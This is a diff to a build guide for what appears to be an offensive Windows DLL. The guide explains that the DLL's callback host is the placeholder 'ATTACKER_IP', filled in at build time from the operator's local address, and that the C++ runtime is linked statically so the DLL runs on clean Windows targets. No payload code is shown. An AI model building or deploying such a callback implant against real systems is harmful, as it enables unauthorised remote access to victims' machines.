@@ -83,8 +83,14 @@ pip3 install -r requirements.txt
 
 ### Compile the DLL (requires MinGW cross-compiler on macOS/Linux)
 
-**Use `build_dll.sh` at the repo root** (`bash build_dll.sh`). It links the
-C++ runtime STATICALLY (`libstdc++.a`, `libwinpthread.a`, `-static-libgcc`).
+**Use `build_dll.sh` at the repo root** — the source carries no address: `dll.cpp`'s
+`g_host` is the literal placeholder `"ATTACKER_IP"` and the script injects the real
+value at build time (build FAILS if you forget it):
+
+```bash
+ATTACKER_IP=$(ipconfig getifaddr en0) bash build_dll.sh
+```
+The script also links the C++ runtime STATICALLY (`libstdc++.a`, `libwinpthread.a`, `-static-libgcc`).
 Do NOT build with a bare `-shared` — the plain recipe produces a DLL that
 imports `libstdc++-6.dll`, `libgcc_s_seh-1.dll` and `libwinpthread-1.dll`,
 which do not exist on a clean Windows machine; the loader then refuses the
